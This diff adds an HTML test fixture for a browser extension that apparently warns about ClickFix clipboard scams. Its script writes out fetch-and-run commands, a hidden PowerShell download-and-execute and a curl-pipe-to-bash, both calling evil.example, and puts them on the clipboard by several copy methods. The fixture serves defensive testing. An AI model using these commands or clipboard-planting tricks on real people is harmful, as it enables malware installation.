@@ -1,0 +1,75 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ClickFix simulation (Scouter Web Guard dev fixture)</title>
+<style>
+  body { font: 15px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; max-width: 680px; margin: 40px auto; padding: 0 20px; color: #222; }
+  h1 { font-size: 20px; }
+  .note { background: #fff8e1; border: 1px solid #f0d58a; border-radius: 8px; padding: 10px 14px; font-size: 13px; color: #6b5300; }
+  button { font: inherit; padding: 10px 16px; border-radius: 8px; border: 1px solid #ccc; background: #fff; cursor: pointer; margin: 6px 8px 6px 0; }
+  button.bad { border-color: #e5484d; color: #b4262a; }
+  code { background: #f3f3f5; padding: 2px 6px; border-radius: 4px; font-size: 13px; }
+  #log { margin-top: 16px; font-size: 13px; color: #555; white-space: pre-wrap; }
+</style>
+</head>
+<body>
+  <h1>ClickFix simulation &mdash; Scouter Web Guard dev fixture</h1>
+  <p class="note">This page is a <b>test fixture</b>. The "scam" command it copies points at
+    <code>evil.example</code> and does nothing. It exists only to verify the extension fires. Load the
+    extension unpacked (or load this page with <code>inject.js</code> + <code>content.js</code>), then
+    click a button below. The guard should throw a red warning overlay.</p>
+
+  <h3>1. Real clipboard write (navigator.clipboard.writeText)</h3>
+  <p>Mimics a modern ClickFix kit. Needs a secure context (https or localhost).</p>
+  <button class="bad" id="b1">Copy a "verify you are human" command</button>
+
+  <h3>2. execCommand('copy') from a hidden field</h3>
+  <p>Mimics the classic hidden-textarea copy kits still use.</p>
+  <button class="bad" id="b2">Copy via execCommand</button>
+
+  <h3>3. Direct signal (bypasses the clipboard API)</h3>
+  <p>Posts the same message the MAIN-world hook would, so content.js can be verified even where the
+     clipboard API is blocked.</p>
+  <button class="bad" id="b3">Simulate a forwarded clipboard write</button>
+
+  <h3>4. Benign copy (must NOT warn)</h3>
+  <button id="b4">Copy some normal text</button>
+
+  <div id="log"></div>
+  <textarea id="hidden" style="position:absolute;left:-9999px" aria-hidden="true"></textarea>
+
+<script>
+  var SCAM = "powershell -nop -w hidden -c \"iex (New-Object Net.WebClient).DownloadString('http://evil.example/x')\"";
+  var SCAM2 = "curl -fsSL http://evil.example/install.sh | bash";
+  var BENIGN = "The quick brown fox jumps over the lazy dog. See https://example.com for details.";
+  function log(m) { document.getElementById("log").textContent += m + "\n"; }
+
+  document.getElementById("b1").onclick = function () {
+    if (!(navigator.clipboard && navigator.clipboard.writeText)) { log("clipboard API unavailable (not a secure context) — use button 3"); return; }
+    navigator.clipboard.writeText(SCAM).then(function(){ log("wrote scam via writeText"); },
+      function(e){ log("writeText failed: " + e); });
+  };
+  document.getElementById("b2").onclick = function () {
+    var t = document.getElementById("hidden");
+    t.value = SCAM2; t.focus(); t.select();
+    var ok = document.execCommand("copy");
+    log("execCommand('copy') returned " + ok);
+  };
+  document.getElementById("b3").onclick = function () {
+    window.postMessage({ __scouterWebGuard: true, kind: "clipboard", via: "test", text: SCAM }, "*");
+    log("posted forwarded-clipboard message");
+  };
+  document.getElementById("b4").onclick = function () {
+    window.postMessage({ __scouterWebGuard: true, kind: "clipboard", via: "test", text: BENIGN }, "*");
+    if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(BENIGN).catch(function(){}); }
+    log("copied benign text (expect NO warning)");
+  };
+</script>
+<!-- Load the extension's scripts as page scripts so the fixture works without installing it.
+     In a real browser both run via the manifest (inject.js in MAIN, content.js isolated). -->
+<script src="../inject.js"></script>
+<script src="../content.js"></script>
+</body>
+</html>
